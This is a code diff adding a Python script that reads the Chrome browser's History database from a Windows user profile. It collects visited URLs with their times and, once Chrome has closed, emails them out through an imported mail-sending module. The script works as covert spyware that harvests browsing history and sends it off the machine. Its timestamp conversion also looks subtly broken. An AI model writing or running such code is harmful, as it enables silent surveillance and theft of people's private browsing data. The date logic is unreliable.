@@ -1,0 +1,39 @@
+import os
+import pathlib
+import sqlite3
+import psutil
+from arrow import Arrow
+from SendMe import send
+
+
+def get_content():
+    # path_to_file = pathlib.Path("C:\\Users\\USER\\Desktop\\History")
+    path_to_file = pathlib.Path(
+        "C:\\Users\\USER\\AppData\\Local\\Google\\Chrome"
+        "\\User "
+        "Data\\Default\\History")
+
+    if os.path.exists(path_to_file):
+        conn = sqlite3.connect(path_to_file)
+        cur = conn.cursor()
+        try:
+            cur.execute("SELECT url, last_visit_time from urls")
+            results = cur.fetchall()
+            txt = ''
+            for r in results:
+                if (Arrow.fromtimestamp(r[1]).shift(years=-369, days=+1) <
+                        Arrow.now().shift(days=-1)):
+                    txt += str(r) + "> "
+            return txt
+        except Exception:
+            pass
+
+
+if __name__ == "__main__":
+    while True:
+        # Check if the application is running
+        if "chrome.exe" not in (p.name() for p in psutil.process_iter()):
+            send.mail_sender("Tytuł", get_content())
+            break
+
+
